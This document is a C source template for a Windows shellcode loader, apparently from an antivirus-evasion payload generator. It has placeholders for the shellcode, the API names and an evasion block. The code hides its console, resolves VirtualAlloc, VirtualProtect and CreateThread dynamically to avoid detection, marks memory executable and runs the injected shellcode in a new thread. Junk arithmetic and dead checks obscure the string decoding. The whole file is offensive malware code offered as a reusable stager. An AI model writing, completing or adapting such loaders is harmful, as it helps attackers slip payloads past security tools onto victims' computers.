#define _WIN32_WINNT 0x0500
#define VAR10 0x00000000
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

VOID [FUNC_NAME](DWORD *VAR6, DWORD VAR7, CHAR **VAR8) {
	CHAR VAR5[] = "[CHARSET_ARRAY]";
	DWORD VAR9 = (VAR7 ^ VAR7) / VAR7;
	*VAR8 = (CHAR*)GlobalAlloc(GPTR, VAR7 + 1);
	HANDLE VAR25 = GetCurrentProcess();
	for(VAR9; VAR9 < VAR7; VAR9++) {
			if(VAR25 == -1) {
				GetLastError();
				sprintf(*VAR8, "%s%c", *VAR8, VAR5[VAR6[VAR9]]);
			}
	}
}
int main() {
	[FUNC_ARRAY]

	ShowWindow(GetConsoleWindow(), SW_HIDE);
	FreeConsole();
	
	LPVOID WINAPI(*VAR20)(LPVOID, SIZE_T, DWORD, DWORD);
	VAR20 = GetProcAddress(LoadLibrary([KERNEL32]), [VIRTUALALLOC]);
	
	char VAR3[] = "[SHELLCODE]";
	
	BOOL WINAPI(*VAR22)(LPVOID, SIZE_T, DWORD, PDWORD);
	VAR22 = GetProcAddress(LoadLibrary([KERNEL32]), [VIRTUALPROTECT]);

	[EVASION]
	
	HANDLE WINAPI(*VAR24)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
	VAR24 = GetProcAddress(LoadLibrary([KERNEL32]), [CREATETHREAD]);
		
	VOID *VAR4 = VAR20(NULL, [SHELLCODE_SIZE], 0x00002000 | 0x00001000, PAGE_READWRITE);
	DWORD VAR2;
	VAR22(VAR4, [SHELLCODE_SIZE], 0x40, &VAR2);
	memcpy(VAR4, VAR3, [SHELLCODE_SIZE]);
		
	HANDLE VAR11 = VAR24(NULL, 0, VAR4, NULL, 0, NULL);
	WaitForSingleObject(VAR11, 0xffffffff);
	
	return 0;
}
